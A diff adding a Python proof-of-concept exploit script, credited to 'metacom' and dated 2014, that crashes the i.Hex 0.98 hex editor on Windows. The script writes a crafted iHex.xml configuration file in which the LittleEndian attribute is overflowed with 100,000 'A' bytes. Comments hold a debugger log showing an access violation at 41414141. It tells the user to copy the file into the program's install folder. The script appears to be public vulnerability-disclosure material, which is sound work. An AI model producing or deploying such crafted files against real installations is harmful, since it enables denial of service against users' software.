@@ -1,0 +1,44 @@
+#!/usr/bin/python
+#Exploit Title:i.Hex Local Crash Poc
+#Homepage:http://www.memecode.com/ihex.php
+#Software Link:www.memecode.com/data/ihex-win32-v0.98.exe
+#Version:i.Hex-v0.98 (Win32 Release)
+#Description:i.Hex is a small and free graphical Hex Editor for Windows..
+#Tested on:Win7 32bit 
+#Exploit Author:metacom --> twitter.com/m3tac0m
+#Date:05.11.2014
+'''
+Immunity Debugger Log data
+EAX 0135B8F8 ASCII "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+ECX 41414141
+EDX 41414141
+EBX 01363FA0
+ESP 0012F6D8
+EBP 0012F700
+ESI 0135B8F0
+EDI 005F0000
+EIP 77B85FBD ntdll.77B85FBD
+
+Press Shift+9
+Log data, item 0
+Address=77B85B44
+Message=[15:56:05] Access violation when reading [41414141]
+'''
+print "\n[*]Vulnerable Created iHex.xml!"
+print "[*]Copy iHex.xml to C:\Program Files\Memecode\i.Hex"
+print "[*]Start i.Hex"
+print "[*]------------------------------------------------"
+poc="\x41" * 100000
+header = "\x3c\x3f\x78\x6d\x6c\x20\x76\x65\x72\x73\x69\x6f\x6e\x3d\x22\x31\x2e\x30\x22\x20\x65\x6e\x63\x6f\x64\x69\x6e\x67\x3d\x22"
+header += "\x55\x54\x46\x2d\x38\x22\x20\x3f\x3e\x0a\x3c\x4f\x70\x74\x69\x6f\x6e\x73\x20\x49\x73\x48\x65\x78\x3d\x22\x31\x22\x0a\x09"
+header += "\x20\x4c\x69\x74\x74\x6c\x65\x45\x6e\x64\x69\x61\x6e\x3d\x22\x0a" + poc
+footer = "\x22\x0a\x09\x20\x50\x6f\x73\x3d\x22\x31\x30\x30\x2c\x31\x30\x30\x2c\x35\x30\x30\x2c\x34\x30\x30\x22\x3e\x0a\x09\x3c\x4d"
+footer += "\x72\x75\x20\x49\x74\x65\x6d\x73\x3d\x22\x30\x22\x0a\x09\x09\x20\x49\x74\x65\x6d\x30\x3d\x22\x22\x20\x2f\x3e\x0a\x3c\x2f"
+footer += "\x4f\x70\x74\x69\x6f\x6e\x73\x3e\x0a"
+payload= header + footer
+# Write out our malicious file
+writeFile = open ("iHex.xml", "wb")
+writeFile.write( payload )
+writeFile.close()
+
+
